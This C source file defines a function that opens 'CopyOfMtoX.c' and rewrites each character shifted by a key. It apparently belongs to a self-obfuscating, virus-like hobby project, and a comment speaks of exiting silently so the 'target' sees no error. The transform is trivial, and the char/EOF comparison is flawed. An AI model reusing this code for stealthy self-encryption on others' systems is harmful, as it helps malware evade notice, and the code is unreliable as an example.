#include "Xichigan.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* Called from: main.c										 					 					*
*																				 							*
* Function to encrypt the file MtoX.c											            *
**********************************************************************************/

/*********************************************************************************
Main Function
**********************************************************************************/
void encryptFile(int key) {
	FILE *fp;
	char ch;

	// Open the file MtoX.c to encrypt
	//fp = fopen("xichigan","r+");
	fp = fopen("CopyOfMtoX.c","r+");

	// Read in the file 1 character at a time and print the value changed by key
	if (fp == NULL){
		//printf("Cannot open file \n");
		exit(0); // Exit with no error to target
	}

	while ((ch = fgetc(fp)) != EOF){
		fseek(fp, ftell(fp) - 1, SEEK_SET);
		fprintf(fp, "%c", ch+key);
	}

	fclose(fp);
}
